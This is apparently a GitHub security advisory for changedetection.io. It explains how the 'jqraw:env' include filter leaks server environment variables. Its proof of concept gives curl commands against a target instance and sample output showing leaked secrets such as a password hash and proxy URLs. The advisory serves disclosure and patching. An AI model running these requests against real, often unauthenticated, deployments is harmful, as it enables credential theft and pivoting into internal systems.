# [H] Changedetection.io Discloses Environment Variables via jq env Builtin in Include Filters

## Summary
Severity: High
Advisory: GHSA-58r7-4wr5-hfx8
CVE: CVE-2026-33981
CWE: CWE-200
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-58r7-4wr5-hfx8
Type: github-advisory

## Affected
- PyPI: `changedetection.io` — affected >=0 <0.54.7

## Details
### Summary

The `jq:` and `jqraw:` include filter expressions allow use of the jq `env` builtin, which reads all process environment variables and stores them as the watch snapshot. An authenticated user (or unauthenticated user when no password is set, the default) can leak sensitive environment variables including `SALTED_PASS`, `PLAYWRIGHT_DRIVER_URL`, `HTTP_PROXY`, and any secrets passed as env vars to the container.

### Details

**Vulnerable file:** `changedetectionio/html_tools.py`, lines 380-388

User-supplied jq filter expressions are compiled and executed without restricting dangerous jq builtins:

```python
if json_filter.startswith("jq:"):
    jq_expression = jq.compile(json_filter.removeprefix("jq:"))
    match = jq_expression.input(json_data).all()
    return _get_stripped_text_from_json_match(match)

if json_filter.startswith("jqraw:"):
    jq_expression = jq.compile(json_filter.removeprefix("jqraw:"))
    match = jq_expression.input(json_data).all()
    return '\n'.join(str(item) for item in match)
```

The form validator at `forms.py:670-673` only checks that the expression compiles (`jq.compile(input)`) — it does not block dangerous functions. The jq `env` builtin reads all process environment variables regardless of the input data, returning a dictionary of every env var in the server process.

### PoC

**Step 1 — Create a watch for any JSON endpoint with `jqraw:env` as the include filter:**

```bash
curl -X POST http://target:5000/api/v1/watch \
  -H "Content-Type: application/json" \
  -H "x-api-key: <api-key>" \
  -d '{
    "url": "https://httpbin.org/json",
    "include_filters": ["jqraw:env"],
    "time_between_check": {"seconds": 30}
  }'
```

If no password or API key is set (the default), no authentication is needed.

**Step 2 — Wait for the watch to be checked, or trigger a recheck:**

```bash
curl "http://target:5000/api/v1/watch/<uuid>?recheck=true" -H "x-api-key: <api-key>"
```

**Step 3 — The processed text file on disk now contains all environment variables:**

```
{'SALTED_PASS': '...hashed password...', 'PLAYWRIGHT_DRIVER_URL': 'ws://browser:3000',
 'HTTP_PROXY': 'socks5h://10.10.1.10:1080', 'SHELL': '/bin/bash',
 'HOME': '/root', 'PATH': '...', 'WERKZEUG_SERVER_FD': '22',
 ... and all other env vars}
```

The data is visible in the web UI when viewing the watch's latest snapshot, and is also included in notification messages if notifications are configured.

**Confirmed on v0.54.6:** The processed text file stored 46 environment variables from the server process.

### Impact

- **Secret exposure:** Leaks `SALTED_PASS` (password hash used for authentication), enabling offline cracking or direct session forgery
- **Infrastructure credential theft:** Leaks `PLAYWRIGHT_DRIVER_URL`, `WEBDRIVER_URL`, `HTTP_PROXY`/`HTTPS_PROXY`, database connection strings, and any API keys or tokens passed as environment variables
- **Cascading access:** Leaked proxy credentials or browser automation URLs can be used to pivot into other internal systems
- **Affects all deployments using jq:** Any instance where the Python `jq` module is installed (standard in Docker deployments) is vulnerable
- **No authentication required by default:** changedetection.io ships with no password and the API accessible without a key, so this is exploitable by any user with network access in the default configuration

## References
- https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-58r7-4wr5-hfx8
- https://nvd.nist.gov/vuln/detail/CVE-2026-33981
- https://github.com/dgtlmoon/changedetection.io/commit/65517a9c74a0cbe1a4661314470b28131ef5557f
- https://github.com/dgtlmoon/changedetection.io
- https://github.com/dgtlmoon/changedetection.io/releases/tag/0.54.7
